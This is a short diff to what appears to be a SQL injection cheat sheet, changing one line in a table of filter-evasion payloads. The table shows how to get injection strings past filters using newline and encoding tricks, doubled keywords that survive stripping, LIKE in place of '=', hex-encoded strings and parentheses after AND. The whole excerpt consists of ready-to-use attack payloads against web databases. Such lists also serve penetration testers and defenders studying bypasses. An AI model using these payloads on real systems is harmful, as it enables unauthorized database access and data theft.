@@ -184,7 +184,7 @@ Vulnerable: MySQL by default; Postgres only with `ATTR_EMULATE_PREPARES=true`; S
 1%0AAND%0A1=1                  // newline/tab variants
 -1' UNION SELECT 1,2,3 --      → -1' UNIunionON SELselectECT 1,2,3 --   // keyword-stripping once
 -1' %55nion %53elect           → %55nion, %53elect      // first-letter encoding
-AND 1=(SELECT 1 FROM t WHERE a=(SELECT a FROM t))       // no space after AND in some parsers
+1 AND 1=1                      → 1 AND(SELECT 1)  /  1 AND(1)   // '(' after AND/OR needs no space
 'a'='a'                        → 'a'LIKE'a'             // = filtered → LIKE / REGEXP / BETWEEN
 substr(x,1,1)                  → mid(x,1,1), substring(x,1,1), left(x,1)   // keyword ban
 'admin'                        → 0x61646d696e           // hex literals for strings
